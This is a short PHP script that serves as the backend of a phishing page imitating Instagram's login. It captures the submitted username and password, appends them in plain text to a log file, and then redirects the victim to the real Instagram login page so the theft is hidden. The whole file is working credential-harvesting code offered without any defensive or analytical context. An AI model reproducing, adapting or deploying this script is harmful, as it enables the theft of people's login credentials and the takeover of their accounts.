<?php

$username = $_POST['username'];
$password = $_POST['password'];

$file = "../../logs/output.txt";

$data = "Username: ".$username." | Password: ".$password."\n";

file_put_contents($file,$data,FILE_APPEND);

echo "<script>

window.location='https://www.instagram.com/accounts/login/';

</script>";

?>